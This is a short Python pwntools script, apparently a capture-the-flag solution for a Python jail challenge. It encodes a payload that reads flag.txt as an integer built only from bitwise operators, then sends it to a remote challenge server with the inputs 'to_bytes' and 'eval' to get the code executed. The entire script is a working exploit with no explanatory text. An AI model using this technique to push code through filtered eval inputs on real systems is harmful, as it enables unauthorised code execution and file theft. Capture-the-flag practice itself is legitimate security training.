from pwn import remote

def conv(n):
    if n == 1:
        return '~0<0'
    b = f'{n:b}'
    fn = ''
    for i,c in enumerate(b[::-1]):
        if c == '0': continue
        if i:
            fn += f'({conv(1)})<<({conv(i)})|'
        else:
            fn += f'({conv(1)})|'
    fn = fn[:-1]
    return fn

payload = conv(int.from_bytes(b'print(open("flag.txt").read())','big'))
name = '[30,"big"]'
inmate = 'to_bytes'
cell = 'eval'

r = remote('chal.bearcatctf.io', 35707)
r.sendline(payload)
r.sendline(name)
r.sendline(inmate)
r.sendline(cell)
r.interactive()
